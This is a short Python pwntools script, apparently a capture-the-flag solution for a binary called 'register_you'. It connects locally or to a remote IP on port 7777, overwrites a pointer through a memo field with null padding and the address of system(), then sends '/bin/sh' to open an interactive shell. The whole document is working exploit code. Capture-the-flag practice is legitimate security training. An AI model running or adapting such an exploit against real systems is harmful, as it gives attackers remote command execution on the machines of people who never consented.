from pwn import *
import sys

b = ELF('./register_you')

if (len(sys.argv) == 1):
	p = process("./register_you")
else:
	p = remote("13.209.121.90", 7777)

payload = "\x00"*(8*3)
payload += p64(b.symbols['system'])

p.recvuntil("exit")
p.sendline("3")
p.recvuntil("memo : ")
p.sendline(payload)
p.recvuntil("exit")
p.sendline("1")
p.recvuntil(":)")
p.sendline("/bin/sh")
p.interactive()
